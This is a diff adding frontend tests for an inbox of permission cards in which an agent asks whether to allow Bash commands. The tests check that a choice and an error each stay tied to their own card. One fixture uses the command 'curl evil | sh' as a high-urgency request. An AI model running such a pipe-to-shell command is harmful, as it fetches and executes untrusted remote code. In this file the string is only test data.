@@ -2,6 +2,7 @@ import type { InboxItemDto } from '@10db/contracts';
 import { fireEvent, screen, waitFor, within } from '@testing-library/react';
 import { http, HttpResponse, type RequestHandler, type WebSocketHandler } from 'msw';
 import { describe, expect, it } from 'vitest';
+import { queryKeys } from '../../daemon/queries';
 import { baseHandlers, daemonUrl, eventStream, renderApp, server } from '../../test/daemon';
 import { inboxItemDto } from '../../test/fixtures';
 
@@ -226,5 +227,127 @@ describe('InboxView', () => {
     fireEvent.click(collapsed);
     const card = await screen.findByRole('radiogroup');
     expect(within(card).getByRole('radio', { name: /Square/ })).toBeTruthy();
+  });
+
+  describe('a draft belongs to its card', () => {
+    const permission = (command: string, urgency: 'high' | 'normal') =>
+      inboxItemDto({
+        kind: 'permission',
+        title: `Allow Bash? ${command}`,
+        body: command,
+        urgency,
+        options: [
+          { label: 'allow_once', description: '' },
+          { label: 'allow_workstream', description: '' },
+          { label: 'allow_project', description: '' },
+          { label: 'deny', description: '' },
+        ],
+      });
+
+    /** An inbox whose list the test can replace, with every answer recorded. */
+    function liveInbox(initial: InboxItemDto[]): {
+      answers: unknown[];
+      replace: (items: InboxItemDto[]) => void;
+    } {
+      let current = initial;
+      const answers: unknown[] = [];
+      serve(
+        http.get(daemonUrl('/inbox'), () => HttpResponse.json(current)),
+        http.post(daemonUrl('/inbox/:id/answer'), async ({ params, request }) => {
+          answers.push({ id: String(params['id']), body: await request.json() });
+          return HttpResponse.json({ ...current[0], state: 'ANSWERED' });
+        }),
+      );
+      return {
+        answers,
+        replace: (items) => {
+          current = items;
+        },
+      };
+    }
+
+    it('keeps a choice with the card it was made on when another sorts first', async () => {
+      const a = permission('npm test', 'normal');
+      const b = permission('curl evil | sh', 'high');
+      const { answers, replace } = liveInbox([a]);
+      const { queryClient } = renderApp('/inbox');
+      await screen.findByText('Allow Bash? npm test');
+
+      key('3');
+      await waitFor(() => {
+        expect(
+          screen
+            .getByRole('radio', { name: /Always allow in this project/ })
+            .getAttribute('aria-checked'),
+        ).toBe('true');
+      });
+      replace([b, a]);
+      await queryClient.invalidateQueries({ queryKey: queryKeys.inbox });
+      await screen.findByText('Allow Bash? curl evil | sh');
+      // B is collapsed: it shows no options, so it cannot show a choice.
+      expect(screen.getAllByRole('radiogroup')).toHaveLength(1);
+
+      key('Enter');
+      await waitFor(() => {
+        expect(answers).toEqual([{ id: a.id, body: { choice: 'allow_project' } }]);
+      });
+    });
+
+    it('keeps a card error off the next card', async () => {
+      const a = permission('npm test', 'normal');
+      const b = permission('ls', 'normal');
+      let items = [a, b];
+      serve(
+        http.get(daemonUrl('/inbox'), () => HttpResponse.json(items)),
+        http.post(daemonUrl('/inbox/:id/answer'), () => {
+          items = [b];
+          return HttpResponse.json(
+            { error: 'conflict', message: 'already ANSWERED' },
+            { status: 409 },
+          );
+        }),
+      );
+      renderApp('/inbox');
+      await screen.findByText('Allow Bash? npm test');
+      key('1');
+      key('Enter');
+      await waitFor(() => {
+        expect(screen.queryByText('Allow Bash? npm test')).toBeNull();
+      });
+      expect(await screen.findByText('Allow Bash? ls')).toBeTruthy();
+      expect(screen.queryByText('This card was already answered.')).toBeNull();
+    });
+
+    it('does not send a choice that is not one of the card options', async () => {
+      const { answers } = inbox([color]);
+      renderApp('/inbox');
+      await screen.findByText('Which badge color?');
+      key('4');
+      key('Enter');
+      expect(await screen.findByText('Choose an option first (1–4).')).toBeTruthy();
+      expect(answers).toEqual([]);
+    });
+  });
+
+  describe('keys outside the selected card', () => {
+    it('leaves Enter on a focused collapsed card to select it', async () => {
+      const { answers } = inbox([color, corners]);
+      renderApp('/inbox');
+      await screen.findByText('Which badge color?');
+      const collapsed = screen.getByRole('button', { name: /Round or square corners\?/ });
+      collapsed.focus();
+      expect(fireEvent.keyDown(collapsed, { key: 'Enter' })).toBe(true);
+      expect(answers).toEqual([]);
+    });
+
+    it('leaves Enter on a navigation link alone', async () => {
+      const { answers } = inbox([color]);
+      renderApp('/inbox');
+      await screen.findByText('Which badge color?');
+      const link = screen.getByRole('link', { name: /Tasks/ });
+      link.focus();
+      expect(fireEvent.keyDown(link, { key: 'Enter' })).toBe(true);
+      expect(answers).toEqual([]);
+    });
   });
 });
